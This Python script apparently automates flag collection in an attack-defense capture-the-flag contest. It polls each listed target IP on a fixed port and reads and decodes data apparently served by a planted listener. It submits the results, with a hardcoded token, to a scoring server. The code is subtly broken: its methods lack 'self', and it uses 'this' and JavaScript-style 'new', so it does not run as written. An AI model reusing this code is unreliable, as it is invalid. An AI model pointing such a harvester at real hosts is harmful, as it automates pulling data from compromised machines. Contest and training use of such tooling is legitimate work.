import multiprocessing
import logging
import socket
import time
import base64
import requests

commit_url=r'http://172.16.100.5:9000/submit_flag/' #url for commit flag
show_only_changed=True
filename=r'targets.txt'
port=55168  #port to connect
interval=30 
class CommitData:
    def __init__(ip,flag,token=''):
        this.ip=ip
        this.flag=flag
        this.token=token if token!='' else r'oDdcfREB94tu89X0txJWtQGK6uLm9rPC5n5kzLSJQfG3XnvJ367CJS2pWP6i0fo6b1FuajAPxMU'   #update token for each competition

    def getIP():
        return this.ip

    def getFlag():
        return this.flag

    def toString():
        return "[%s]=%s"%(this.ip,this.flag)

    def getCommitData():
        return {'flag':this.flag,'token':this.token}


log_format='%(asctime)s %(message)s'
#config log->file and console
l=logging.INFO
#l=logging.DEBUG
logging.basicConfig(level=l,format=log_format,datefmt='%a, %d %b %Y %H:%M:%S',filename='server.log',filemode='w')
console=logging.StreamHandler()
console.setLevel(l)
formatter = logging.Formatter(log_format)
console.setFormatter(formatter)
logging.getLogger('').addHandler(console)

flags={}


def decode(s):
    s=base64.b64decode(s)
    s=s[:-7]+chr(ord(s[-7])-1)+s[-6:-5]+chr(ord(s[-5])-1)+s[-4:-3]+chr(ord(s[-3])-1)+s[-2:-1]+chr(ord(s[-1])-1)
    return s

def commitFlag(data):
    global commit_url
    r=requests.post(commit_url,data=data.getCommitData())
    # r.close()
    #logging.debug(r.url+r.status_code)

def w(ip):
    global flags,interval
    logging.debug(ip+' process Starting...')
    data=''
    s=None
    while True:
        try:
            data=''
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(3)
            logging.debug('connectting '+ip)
            s.connect((ip,port))
            data=s.recv(2048)
            data=decode(data)
            data=new CommitData(ip,data)
        except Exception as e:
            logging.debug(data.toString()+e.message)
            data=None
        finally:
            if data:
                if not show_only_changed or  flags.get(ip)!=data.getFlag():
                    flags[ip]=data.getFlag()
                    logging.info(data)
                    commitFlag(data)
                logging.debug(data)
            s.close()
            time.sleep(interval)

if __name__=='__main__':
    logging.info('Starting server...')
    targets=[]
    for line in open(filename).readlines():
        targets.append(line.strip())
    logging.debug('Found targets:'+str(len(targets)))
    pool=multiprocessing.Pool(10)
    for target in targets:
        pool.apply_async(w,(target,))
    pool.close()
    pool.join()
    logging.info('Endding...')
